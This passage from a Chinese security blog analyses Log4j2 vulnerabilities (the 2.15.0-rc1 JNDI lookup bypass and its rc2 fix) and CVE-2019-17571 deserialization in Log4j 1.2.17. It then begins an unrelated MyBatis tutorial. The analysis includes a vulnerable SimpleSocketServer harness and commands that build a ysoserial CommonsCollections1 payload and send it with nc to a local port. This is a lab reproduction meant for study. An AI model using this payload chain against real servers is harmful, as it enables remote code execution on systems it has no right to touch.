(org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:<span class="number">542</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:<span class="number">500</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">483</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">417</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">82</span>, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">161</span>, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:<span class="number">2205</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:<span class="number">2159</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:<span class="number">2142</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:<span class="number">2017</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:<span class="number">1983</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">error:<span class="number">740</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:<span class="number">10</span>, RC1Bypass (org.example)</span><br></pre></td></tr></table></figure>

<h2 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h2><p><strong>第一</strong>：<br>首先在准备阶段，需要获取配置文件中的信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(RC1Bypass.class);</span><br></pre></td></tr></table></figure>

<p>跳过中间步骤，来到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> MessagePatternConverter <span class="title function_">newInstance</span><span class="params">(<span class="keyword">final</span> Configuration config, <span class="keyword">final</span> String[] options)</span> &#123;</span><br><span class="line">    <span class="comment">// 判断是否开启lookups</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">lookups</span> <span class="operator">=</span> loadLookups(options);</span><br><span class="line">    String[] formats = withoutLookupOptions(options);</span><br><span class="line">    <span class="type">TextRenderer</span> <span class="variable">textRenderer</span> <span class="operator">=</span> loadMessageRenderer(formats);</span><br><span class="line">    <span class="type">MessagePatternConverter</span> <span class="variable">result</span> <span class="operator">=</span> formats != <span class="literal">null</span> &amp;&amp; formats.length != <span class="number">0</span> ? <span class="keyword">new</span> <span class="title class_">FormattedMessagePatternConverter</span>(formats) : MessagePatternConverter.SimpleMessagePatternConverter.INSTANCE;</span><br><span class="line">    <span class="comment">// 如果开启，就新建LookupMessagePatternConverter</span></span><br><span class="line">    <span class="keyword">if</span> (lookups &amp;&amp; config != <span class="literal">null</span>) &#123;</span><br><span class="line">        result = <span class="keyword">new</span> <span class="title class_">LookupMessagePatternConverter</span>((MessagePatternConverter)result, config);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (textRenderer != <span class="literal">null</span>) &#123;</span><br><span class="line">        result = <span class="keyword">new</span> <span class="title class_">RenderingPatternConverter</span>((MessagePatternConverter)result, textRenderer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (MessagePatternConverter)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在MessagePatternConverter类的loadLookups中判断是否开启lookups</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">loadLookups</span><span class="params">(<span class="keyword">final</span> String[] options)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (options != <span class="literal">null</span>) &#123;</span><br><span class="line">        String[] var1 = options;</span><br><span class="line">        <span class="type">int</span> <span class="variable">var2</span> <span class="operator">=</span> options.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="number">0</span>; var3 &lt; var2; ++var3) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">option</span> <span class="operator">=</span> var1[var3];</span><br><span class="line">            <span class="comment">// 这里</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;lookups&quot;</span>.equalsIgnoreCase(option)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119201941.png"></p>
<p>回到MessagePatternConverter实例化函数，由于lookups为true，所以构造LookupMessagePatternConverter<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119203118.png"></p>
<p>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">loadLookups:<span class="number">53</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">newInstance:<span class="number">89</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">createConverter:<span class="number">590</span>, PatternParser (org.apache.logging.log4j.core.pattern)</span><br><span class="line">finalizeConverter:<span class="number">657</span>, PatternParser (org.apache.logging.log4j.core.pattern)</span><br><span class="line">parse:<span class="number">420</span>, PatternParser (org.apache.logging.log4j.core.pattern)</span><br><span class="line">parse:<span class="number">177</span>, PatternParser (org.apache.logging.log4j.core.pattern)</span><br><span class="line">build:<span class="number">474</span>, PatternLayout$SerializerBuilder (org.apache.logging.log4j.core.layout)</span><br><span class="line">&lt;init&gt;:<span class="number">140</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">&lt;init&gt;:<span class="number">61</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">build:<span class="number">770</span>, PatternLayout$Builder (org.apache.logging.log4j.core.layout)</span><br><span class="line">build:<span class="number">627</span>, PatternLayout$Builder (org.apache.logging.log4j.core.layout)</span><br><span class="line">build:<span class="number">122</span>, PluginBuilder (org.apache.logging.log4j.core.config.plugins.util)</span><br><span class="line">createPluginObject:<span class="number">1107</span>, AbstractConfiguration (org.apache.logging.log4j.core.config)</span><br><span class="line">createConfiguration:<span class="number">1032</span>, AbstractConfiguration (org.apache.logging.log4j.core.config)</span><br><span class="line">createConfiguration:<span class="number">1024</span>, AbstractConfiguration (org.apache.logging.log4j.core.config)</span><br><span class="line">createConfiguration:<span class="number">1024</span>, AbstractConfiguration (org.apache.logging.log4j.core.config)</span><br><span class="line">doConfigure:<span class="number">643</span>, AbstractConfiguration (org.apache.logging.log4j.core.config)</span><br><span class="line">initialize:<span class="number">243</span>, AbstractConfiguration (org.apache.logging.log4j.core.config)</span><br><span class="line">start:<span class="number">289</span>, AbstractConfiguration (org.apache.logging.log4j.core.config)</span><br><span class="line">setConfiguration:<span class="number">626</span>, LoggerContext (org.apache.logging.log4j.core)</span><br><span class="line">reconfigure:<span class="number">699</span>, LoggerContext (org.apache.logging.log4j.core)</span><br><span class="line">reconfigure:<span class="number">716</span>, LoggerContext (org.apache.logging.log4j.core)</span><br><span class="line">start:<span class="number">270</span>, LoggerContext (org.apache.logging.log4j.core)</span><br><span class="line">getContext:<span class="number">155</span>, Log4jContextFactory (org.apache.logging.log4j.core.impl)</span><br><span class="line">getContext:<span class="number">47</span>, Log4jContextFactory (org.apache.logging.log4j.core.impl)</span><br><span class="line">getContext:<span class="number">196</span>, LogManager (org.apache.logging.log4j)</span><br><span class="line">getLogger:<span class="number">599</span>, LogManager (org.apache.logging.log4j)</span><br><span class="line">&lt;clinit&gt;:<span class="number">7</span>, RC1Bypass (org.example)</span><br></pre></td></tr></table></figure>

<p>观察这个函数调用能够得到如何解析配置文件的</p>
<p><strong>第二</strong>：<br>接下来进入到测试代码的主函数中，还是回到第一个关键点toSerializable方法，此时的convert是计划中的LookupMessagePatternConverter<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119203348.png"></p>
<p>进入LookupMessagePatternConverter的format方法，这里会寻找”${“，并且进行替换操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> toAppendTo.length();</span><br><span class="line">        <span class="comment">// 格式化</span></span><br><span class="line">        <span class="built_in">this</span>.delegate.format(event, toAppendTo);</span><br><span class="line">        <span class="comment">// 寻找$&#123;</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">indexOfSubstitution</span> <span class="operator">=</span> toAppendTo.indexOf(<span class="string">&quot;$&#123;&quot;</span>, start);</span><br><span class="line">        <span class="keyword">if</span> (indexOfSubstitution &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 这里</span></span><br><span class="line">            <span class="built_in">this</span>.config.getStrSubstitutor().replaceIn(event, toAppendTo, indexOfSubstitution, toAppendTo.length() - indexOfSubstitution);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119203724.png"></p>
<p><strong>第三</strong>：<br>跳过中间的步骤，来到JndiLookup的lookup方法处，获取JndiManager对象的操作前面已经讲了，接下来就是进入其lookup方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">var6 = Objects.toString(jndiManager.lookup(jndiName), (String)<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>由于构造的URL中test前面存在空格，所以在解析下面代码中会报异常</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(name);</span><br></pre></td></tr></table></figure>

<p>然后执行最后的lookup操作，lookup会自动去掉空格，从而导致RCE<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119204528.png"></p>
<h1 id="log4j-2-15-0-rc2分析"><a href="#log4j-2-15-0-rc2分析" class="headerlink" title="log4j-2.15.0-rc2分析"></a>log4j-2.15.0-rc2分析</h1><p>github commit地址：<a href="https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658">https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658</a></p>
<p>该commit修补了rc1带来的缺陷，在URISyntaxException异常的空缺块上加了return处理，这样就不会是使程序执行至最后一行<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119232748.png"></p>
<h1 id="落幕"><a href="#落幕" class="headerlink" title="落幕"></a>落幕</h1><p>在2.15.0-rc2版本之后，还是出现过一些问题，如：<br>2.15.0-rc2版本包括之前的版本由于lookups功能能够导致DOS攻击(CVE-2021-45046)</p>
<p>在2.15.1-rc1中，默认禁用jndi<br>在2.16.0中，完全移除了lookup功能，修改了MessagePatternConverter实例化中的逻辑，并且删除了LookupMessagePatternConverter这个内部类<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231120110302.png"></p>
<h1 id="CVE-2019-17571"><a href="#CVE-2019-17571" class="headerlink" title="CVE-2019-17571"></a>CVE-2019-17571</h1><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>1.2.4 &lt;&#x3D; Apache Log4j &lt;&#x3D; 1.2.17</p>
<h2 id="SimpleSocketServer类"><a href="#SimpleSocketServer类" class="headerlink" title="SimpleSocketServer类"></a>SimpleSocketServer类</h2><p>org.apache.log4j.net.SimpleSocketServer：该类是一个简单的基于 Socket 的日志消息接收服务器，用于接收远程 log4j 客户端发送的日志消息并将其记录到日志文件中。它监听指定的端口，等待客户端连接，并接收客户端发送的日志事件。</p>
<p>通过启动 SimpleSocketServer，可以在服务器上运行一个 log4j 服务器，接收来自远程客户端的日志消息。这对于集中式日志记录和日志集中化非常有用，特别是在分布式系统或基于网络的应用程序中。</p>
<p>使用 SimpleSocketServer 时，可以配置它的日志记录器、日志格式、日志文件路径等。</p>
<p>默认开启4560端口</p>
<h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>SimpleSocketServer.main会开启一个端口，接收客户端传输过来的数据并对其进行反序列化</p>
<h2 id="测试环境-1"><a href="#测试环境-1" class="headerlink" title="测试环境"></a>测试环境</h2><p>log4j-1.2.17.jar jdk1.8_66<br>1.2.17下载地址：<a href="https://archive.apache.org/dist/logging/log4j/">https://archive.apache.org/dist/logging/log4j/</a><br>或直接maven导入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>加入commons-collections3.1</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.log4j.net.SimpleSocketServer;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE201917571</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;INFO: Log4j Listening on port 4444&quot;</span>);</span><br><span class="line">        String[] arguments = &#123;<span class="string">&quot;4444&quot;</span>, (<span class="keyword">new</span> <span class="title class_">CVE201917571</span>()).getClass().getClassLoader().getResource(<span class="string">&quot;log4j.properties&quot;</span>).getPath()&#125;;</span><br><span class="line">        SimpleSocketServer.main(arguments);</span><br><span class="line">        System.out.println(<span class="string">&quot;INFO: Log4j output successfuly.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置文件log4j.properties中的内容：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">log4j.rootCategory=DEBUG,stdout</span><br><span class="line">log4j.appender.stdout=org.apache.log4j.ConsoleAppender</span><br><span class="line">log4j.appender.stdout.layout=org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.stdout.threshold=DEBUG</span><br><span class="line">log4j.appender.stdout.layout.ConversionPattern=[%d&#123;yyy-MM-dd HH:mm:ss,SSS&#125;]-[%p]-[MSG!:%m]-[%c\:%L]%n</span><br></pre></td></tr></table></figure>

<h2 id="函数调用栈-2"><a href="#函数调用栈-2" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>构造ObjectInputStream函数调用栈</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;init&gt;:<span class="number">65</span>, SocketNode (org.apache.log4j.net)</span><br><span class="line">main:<span class="number">67</span>, SimpleSocketServer (org.apache.log4j.net)</span><br><span class="line">main:<span class="number">9</span>, CVE201917571 (org.example)</span><br></pre></td></tr></table></figure>

<p>线程下的函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">transform:<span class="number">121</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:<span class="number">77</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-<span class="number">1</span>, $Proxy0 (com.sun.proxy)</span><br><span class="line">readObject:<span class="number">444</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">run:<span class="number">82</span>, SocketNode (org.apache.log4j.net)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<h2 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h2><p>将断点下在SimpleSocketServer类的main方法中<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231117170159.png"></p>
<p>进入main函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String argv[])</span> &#123;</span><br><span class="line">    <span class="comment">// 读取配置文件，初始化操作</span></span><br><span class="line">    <span class="keyword">if</span>(argv.length == <span class="number">2</span>) &#123;</span><br><span class="line">      init(argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      usage(<span class="string">&quot;Wrong number of arguments.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      cat.info(<span class="string">&quot;Listening on port &quot;</span> + port);</span><br><span class="line">      <span class="comment">// 新建一个ServerSocket对象</span></span><br><span class="line">      <span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(port);</span><br><span class="line">      <span class="comment">// 循环接收客户端的等待连接</span></span><br><span class="line">      <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        cat.info(<span class="string">&quot;Waiting to accept a new client.&quot;</span>);</span><br><span class="line">        <span class="comment">// 接受</span></span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> serverSocket.accept();</span><br><span class="line">        cat.info(<span class="string">&quot;Connected to client at &quot;</span> + socket.getInetAddress());</span><br><span class="line">        cat.info(<span class="string">&quot;Starting new socket node.&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建一个线程</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">SocketNode</span>(socket,</span><br><span class="line">                    LogManager.getLoggerRepository()),<span class="string">&quot;SimpleSocketServer-&quot;</span> + port).start();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行到serverSocket.accept();会一致等待接收，此时使用ysoserial生成CC1链的payload，再使用nc向目标ip和端口发送数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections1 <span class="string">&quot;calc.exe&quot;</span> &gt; cve201917571</span><br><span class="line"><span class="built_in">cat</span> cve201917571| nc 127.0.0.1 4444</span><br></pre></td></tr></table></figure>

<p>此时accept成功接收到一个客户端的连接<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231117171246.png"></p>
<p>主要看创建线程的代码，里面参数中new了一个SocketNode对象，进入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SocketNode</span><span class="params">(Socket socket, LoggerRepository hierarchy)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.socket = socket;</span><br><span class="line">    <span class="built_in">this</span>.hierarchy = hierarchy;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个ObjectInputStream对象ois，数据从socket中获取数据流</span></span><br><span class="line">      ois = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(</span><br><span class="line">                         <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(socket.getInputStream()));</span><br><span class="line">    &#125; <span class="keyword">catch</span>(InterruptedIOException e) &#123;</span><br><span class="line">      Thread.currentThread().interrupt();</span><br><span class="line">      logger.error(<span class="string">&quot;Could not open ObjectInputStream to &quot;</span>+socket, e);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IOException e) &#123;</span><br><span class="line">      logger.error(<span class="string">&quot;Could not open ObjectInputStream to &quot;</span>+socket, e);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(RuntimeException e) &#123;</span><br><span class="line">      logger.error(<span class="string">&quot;Could not open ObjectInputStream to &quot;</span>+socket, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231117171533.png"></p>
<p>跳出之后，主线程的新建一个子线程，并传递刚刚获取的SocketNode对象，并调用线程的启动函数strat</p>
<p>接下来就是子线程执行的部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (target != <span class="literal">null</span>) &#123;</span><br><span class="line">        target.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的target就是前面得到的SocketNode对象</p>
<p>进入该对象的run方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    LoggingEvent event;</span><br><span class="line">    Logger remoteLogger;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (ois != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">	        <span class="comment">// read an event from the wire</span></span><br><span class="line">            <span class="comment">// 调用readObejct方法，从ois中读取一个对象，这也是反序列化触发的地方</span></span><br><span class="line">	        event = (LoggingEvent) ois.readObject();</span><br><span class="line">	        <span class="comment">// get a logger from the hierarchy. The name of the logger is taken to be the name contained in the event.</span></span><br><span class="line">	        remoteLogger = hierarchy.getLogger(event.getLoggerName());</span><br><span class="line">	        <span class="comment">//event.logger = remoteLogger;</span></span><br><span class="line">	        <span class="comment">// apply the logger-level filter</span></span><br><span class="line">	        <span class="keyword">if</span>(event.getLevel().isGreaterOrEqual(remoteLogger.getEffectiveLevel())) &#123;</span><br><span class="line">	        <span class="comment">// finally log the event as if was generated locally</span></span><br><span class="line">	        remoteLogger.callAppenders(event);</span><br><span class="line">	      &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231117172522.png"><br>此时的ois正是由CC1链构造的恶意payload，能够导致RCE，接下来就是CC1链中的过程</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://tttang.com/archive/1378/">浅谈 Log4j2 漏洞</a><br><a href="https://4ra1n.github.io/2022/002.html">Log4j2从RC1绕过到RC2拒绝服务</a><br><a href="https://mp.weixin.qq.com/s/TDiFFhysSVATp8BGWVNtHg">Log4j2系列漏洞分析汇总</a><br><a href="https://www.freebuf.com/vuls/316143.html">Log4j2的JNDI注入漏洞（CVE-2021-44228）原理分析与思考</a><br><a href="https://zhuanlan.zhihu.com/p/448919768">APACHE LOG4J多个高危漏洞（CVE-2021-44228&#x2F;CVE-2021-4104&#x2F;CVE-2021-45046&#x2F;CVE-2021-45105）处置手册</a></p>
<blockquote>
<p>注：本文首发于<a href="https://xz.aliyun.com/t/13077">https://xz.aliyun.com/t/13077</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础之Mybatis框架</title>
    <url>/2022/12/01/Mybatis/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ol>
<li><p>mybatis 是一个优秀的基于 java 的持久层框架，它内部封装了 jdbc，使开发者只需要关注 sql 语句本身，而不需要花费精力去处理加载驱动、创建连接、创建 statement 等繁杂的过程。</p>
</li>
<li><p>mybatis 通过 xml 或注解的方式将要执行的各种 statement 配置起来，并通过 java 对象和 statement 中sql 的动态参数进行映射生成最终执行的 sql 语句，最后由 mybatis 框架执行 sql 并将结果映射为 java 对象并返回。</p>
</li>
<li><p>采用 ORM 思想解决了实体和数据库映射的问题，对 jdbc 进行了封装，屏蔽了 jdbc api 底层访问细节，使我们不用与 jdbc api 打交道，就可以完成对数据库的持久化操作。</p>
</li>
</ol>
<p><a href="https://mybatis.net.cn/">MyBatis中文网</a></p>
<h1 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h1><h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><ol>
<li>创建Maven工程，导入坐标</li>
<li>创建实体类和接口</li>
<li>创建Mybatis核心配置文件</li>
<li>创建SQL映射文件</li>
<li>编码<ul>
<li>加载核心配置文件，获取SqlSessionFactory对象</li>
<li>获取SqlSession对象，执行SQL语句</li>
<li>释放资源</li>
</ul>
</li>
</ol>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ol>
<li><p>前提</p>
<p>创建test数据库，在数据库中创建表并添加数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database if <span class="keyword">not</span> <span class="keyword">exists</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_user (</span><br><span class="line">    id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    username <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    password <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    age <span class="type">int</span>,</span><br><span class="line">    address <span class="type">varchar</span>(<span class="number">100</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user <span class="keyword">values</span> (<span class="number">1</span>, <span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="number">23</span>, <span class="string">&#x27;Beijing&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user <span class="keyword">values</span> (<span class="number">2</span>, <span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;456&#x27;</span>, <span class="number">24</span>, <span class="string">&#x27;Hangzhou&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user <span class="keyword">values</span> (<span class="number">3</span>, <span class="string">&#x27;wangwu&#x27;</span>, <span class="string">&#x27;789&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;Guangzhou&#x27;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建maven工程，并配置pom.xml</p>
<p>添加mybatis包依赖和对应的jdbc驱动依赖</p>
